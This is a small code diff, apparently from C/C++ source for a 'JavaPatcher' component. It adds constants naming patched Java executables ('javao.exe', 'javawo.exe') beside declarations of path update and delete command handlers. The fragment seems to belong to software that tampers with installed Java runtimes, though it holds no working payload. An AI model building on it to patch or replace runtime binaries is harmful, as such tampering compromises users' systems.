@@ -19,6 +19,10 @@ const char JavaPatcherSignalFile[] = "Pat.txt";
 const char JavaPatcherPidsFile[] = "wj.dat";
 
 
+// Имена пропатченных ехе
+const char Patched_Jawa_Name[]  = "javao.exe";
+const char Patched_JawaW_Name[] = "javawo.exe";
+
 
 bool ExecuteUpdatePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
 bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
